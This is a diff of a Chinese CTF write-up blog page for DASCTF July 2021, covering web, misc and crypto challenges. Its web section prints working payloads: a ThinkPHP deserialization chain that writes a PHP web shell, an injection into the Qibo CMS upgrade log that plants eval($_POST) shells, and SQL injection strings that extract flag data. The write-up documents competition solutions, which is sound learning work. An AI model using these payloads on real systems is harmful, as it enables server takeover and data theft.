 <pre class="line-numbers language-none"><code class="language-none">http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A130%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>生成的木马在 <code>/runtime/a.php12ac95f1498ce51d2d96a249c09c1998.php</code>，密码 <code>ccc</code></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810042044570.png" alt=""></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810044205162.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810042044570.png"></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810044205162.png"></p>
 <hr>
-<h4 id="打法2-升级日志-RCE">打法2 升级日志 RCE</h4>
-<p>参考 Y4tacker 师傅的 <a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/119318403">[代码审计]齐博建站系统x1.0企业版代码审计</a> （Orz</p>
+<h4 id="打法2-升级日志-RCE"><a href="#打法2-升级日志-RCE" class="headerlink" title="打法2 升级日志 RCE"></a>打法2 升级日志 RCE</h4><p>参考 Y4tacker 师傅的 <a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/119318403">[代码审计]齐博建站系统x1.0企业版代码审计</a> （Orz</p>
 <p><code>application/admin/controller/Upgrade.php</code>下的 <code>sysup</code> 函数在写入升级日志时直接拼接了 GET 参数中的 <code>upgrade_edition</code>，且写入的文件后缀为 <code>.php</code></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810032954867.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810032954867.png"></p>
 <p>构造 payload</p>
 <pre class="line-numbers language-none"><code class="language-none">",""=&gt;eval($_POST[%27miao%27])-"//
 
 原文中的是
 ",""=&gt;-eval($_POST[%27yyds%27])-",];?&gt;//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-none"><code class="language-none">http://xxxxx/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3Eeval($_POST[%27miao%27])-%22//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810032133050.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810032133050.png"></p>
 <p>在 <a target="_blank" rel="noopener" href="http://xxx/runtime/client_upgrade_edition.php">http://xxx/runtime/client_upgrade_edition.php</a> 生成了一句话木马。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810032234117.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810032234117.png"></p>
 <p>拼接后的文件内容为</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"md5"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token operator">=&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'miao'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token string double-quoted-string">"//"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"time"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"2021-08-03 17:31"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810034527169.png" alt=""></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810034717030.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810034527169.png"></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810034717030.png"></p>
 <p>其实寻思着 payload 改成下面这个更好，拼接字符串不会报 warning 23333.</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string double-quoted-string">","</span><span class="token string double-quoted-string">"=&gt;eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">27</span>miao<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span></span>)."</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="安全-安全-还是xxx的安全">安全,安全,还是xxx的安全</h3>
-<blockquote>
+
+
+<h3 id="安全-安全-还是xxx的安全"><a href="#安全-安全-还是xxx的安全" class="headerlink" title="安全,安全,还是xxx的安全"></a>安全,安全,还是xxx的安全</h3><blockquote>
 <p>某个特别安全的商店</p>
 <p><strong>Hint:</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">CREATE TABLE "users" (
@@ -1136,11 +1131,11 @@ CMD nginx &amp;&amp; useradd ctf &amp;&amp; su ctf -c 'hypercorn  --bind 0.0.0.0
 CREATE TABLE "flaaaaaaaaag" (
   "flllllllag" TEXT
 );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-</blockquote>
 <p><strong>是个零解题。</strong></p>
+</blockquote>
 <p>根据给的 hint 可以知道是要 <strong>SQL 注入</strong>。</p>
 <p>本来以为注入点在 购买 这里的 flag 数量上，然而并没有找到回显点，而且返回错误 Hacker 了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210811225941416.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210811225941416.png"></p>
 <p>参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/erR0Ratao/p/15088223.html">erR0Ratao 师傅的 wp</a>，注入点在注册功能的 <code>pay_password</code>  处。</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
     el<span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>
@@ -1209,7 +1204,7 @@ CREATE TABLE "flaaaaaaaaag" (
 <p>根据 hint，<code>pay_password</code> 后面还有一个 <code>flag_num</code> 字段，构造 payload 为</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>a8b5a33639258fd9476bb66d3b7202d'<span class="token punctuation">,</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>登录之后可以发现改成功了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812000103823.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812000103823.png"></p>
 <p>于是再构造</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>a8b5a33639258fd9476bb66d3b7202d'<span class="token punctuation">,</span>hex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flllllllag <span class="token keyword">from</span> flaaaaaaaaag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>直接用浏览器在注册页面执行下面的 js 代码。</p>
@@ -1252,23 +1247,23 @@ axios
         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>然后 hex 解码一下就完事了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812000623743.png" alt=""></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812000643903.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812000623743.png"></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812000643903.png"></p>
 <p>另外，可以根据数据库版本的语句来判断数据库类型：</p>
 <p>Mysql <code>version()</code>、Sqlserver <code>@@VERSION</code>、Sqlite <code>sqlite_version()</code></p>
 <p>提示 hacker 可能是后端执行出错了，而 <code>sqlite_version()</code> 成功执行，说明是 sqlite，版本是 3.27.2。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812001051806.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812001051806.png"></p>
 <p>唔，其实不用 hex 也可以的……</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812001247053.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812001247053.png"></p>
 <br>
+
 <hr>
 <br>
-<h2 id="Misc">Misc</h2>
-<h3 id="red-vs-blue">red_vs_blue</h3>
-<blockquote>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote>
 <p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p>
 </blockquote>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801000150532.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801000150532.png"></p>
 <p>发现他这个记录在一个 session 里是固定不变的，写个脚本记录一下，错了重试就完事了。</p>
 <p>（就是有点麻烦，脚本写的有点丑，还调了老半天……还是太菜了，唉</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
@@ -1332,17 +1327,15 @@ retry <span class="token operator">=</span> <span class="token boolean">False</s
 
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801032610205.png" alt=""></p>
-<h3 id="问卷题">问卷题</h3>
-<p><code>DASCTF{79f3bb47a2e2d46def82c052eccb7b80}</code></p>
-<h3 id="ezSteganography">ezSteganography</h3>
-<p>又是开局一张图。</p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801032610205.png"></p>
+<h3 id="问卷题"><a href="#问卷题" class="headerlink" title="问卷题"></a>问卷题</h3><p><code>DASCTF{79f3bb47a2e2d46def82c052eccb7b80}</code></p>
+<h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><p>又是开局一张图。</p>
 <p><img src="/2021/08/15/CTF_2021DASCTF_July/ezSteganography-flag2.png" alt="ezSteganography-flag"></p>
 <p>Red 0 有线索</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801165708567.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801165708567.png"></p>
 <p>Green 平面一看就有隐写</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801170035668.png" alt=""></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801170003081.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801170035668.png"></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210801170003081.png"></p>
 <p>提取得到一张图</p>
 <p><img src="/2021/08/15/CTF_2021DASCTF_July/green.png" alt="green"></p>
 <p>qim quantization</p>
@@ -1439,14 +1432,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
     sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810052126031.png" alt=""></p>
-<h3 id="Nuclear-wastewater">Nuclear wastewater</h3>
-<blockquote>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210810052126031.png"></p>
+<h3 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h3><blockquote>
 <p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p>
 </blockquote>
 <p>![Nuclear wastewater](CTF_2021DASCTF_July/Nuclear wastewater.png)</p>
 <p>写个脚本提取出每个像素的颜色，可以发现 rgb 中只有一个通道有数值。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812002950140.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812002950140.png"></p>
 <p><code>chr</code> 读一下。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> Counter
 <span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
@@ -1473,21 +1465,21 @@ r <span class="token operator">=</span> Counter<span class="token punctuation">(
 info <span class="token operator">=</span> r<span class="token punctuation">.</span>most_common<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> info<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token comment"># theKEYis:#R@/&amp;p~!(?£ñ$ªVJÞÍFjÀÈ÷¢©¼§UÌ¦õ±·ðäôÉCS2ÚHÏ&gt;Á</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812003907676.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812003907676.png"></p>
 <p>得到压缩包密码 <code>#R@/&amp;p~!</code>，里面内容为</p>
 <pre class="line-numbers language-none"><code class="language-none">‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‌‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‍‍‍‎‌‌‌‌‌‌‌‌‍‎‎‍‌‍‍‌‌‌‍‍‎‎‌‌‌‌‌‌‌‌‍‎‍‍‌‌‌‌‌‌‌‍‎‎‌‌‍‌‎‎‎‍‌‌‍‌‍‌‌‎‎‍‎‌‌‎‌‌‍‍‌‌‍‎‍‌‍‍‌‍‌‎‌‌‎‌‌‍‍‌‍‍‌‍‎‎‎‎‎‍‌‍‌‍‌‍‎‍‍‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‌‎‎‌‌‌‌‌‌‍‍‌‎‌‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‌‎‍‌‎‌‌‍‌‍‍‍‎‍‎‍‎‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‎‍‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‌‌‍‌‌‌‍‌‍‎‍‌‌‍‎‎OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI‌‍‌‌‌‍‍‌‎‌‍‌‍‌‌‌‍‌‎‎‎‍‌‍‎‎‌‌‍‎‍‌‎<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>可以发现有零宽字符隐写，包含了 200c 200d 200e</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812010557536.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812010557536.png"></p>
 <p><a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812010608022.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812010608022.png"></p>
 <p>Citrix CTX1 decode</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812010812576.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210812010812576.png"></p>
 <br>
+
 <hr>
 <br>
-<h2 id="Crypto">Crypto</h2>
-<h3 id="Yusa的密码学签到——BlockTrick">Yusa的密码学签到——BlockTrick</h3>
-<p>题目源码</p>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h3><p>题目源码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
 <span class="token keyword">import</span> os
 <span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
@@ -1518,14 +1510,15 @@ enc <span class="token operator">=</span> AES<span class="token punctuation">.</
 <p>AES MODE_CBC，需要加密前后的结果相同且不为空。可以参考 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">CBC 的原理框图</a>。</p>
 <p><img src="/2021/08/15/CTF_2021DASCTF_July/Cbc_encryption.png" alt="Cbc encryption"></p>
 <p>这里就是两轮 CBC，只需要把发过来的再返回去两次就完事了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210804233505706.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210804233505706.png"></p>
 <p>原理大概是，第一次将初始向量 IV 与自己进行异或，得到一组零向量，把经过 CBC 后得到的 cipher 再与本身异或也是得到零向量，而这个加密器可以看作一种输入到输出的映射，对于同样的零向量输入，结果就一样了。</p>
-<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210804225131326.png" alt=""></p>
+<p><img src="/2021/08/15/CTF_2021DASCTF_July/image-20210804225131326.png"></p>
 <br>
+
 <hr>
 <br>
-<h2 id="小结">小结</h2>
-<p>这篇写得好累啊……</p>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇写得好累啊……</p>
 <p>其实还是挺有味道的，学到了不少。</p>
 <p>喵喵是 fw，喵呜呜呜（</p>
 <p><em>（溜了溜了喵</em></p>
@@ -1550,6 +1543,7 @@ https://www.anquanke.com/post/id/250113#h3-13
 
 
 -->
+
 
                 
             </div>
@@ -2101,7 +2095,7 @@ https://www.anquanke.com/post/id/250113#h3-13
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.3k</span>&nbsp;字
+                class="white-color">308.1k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
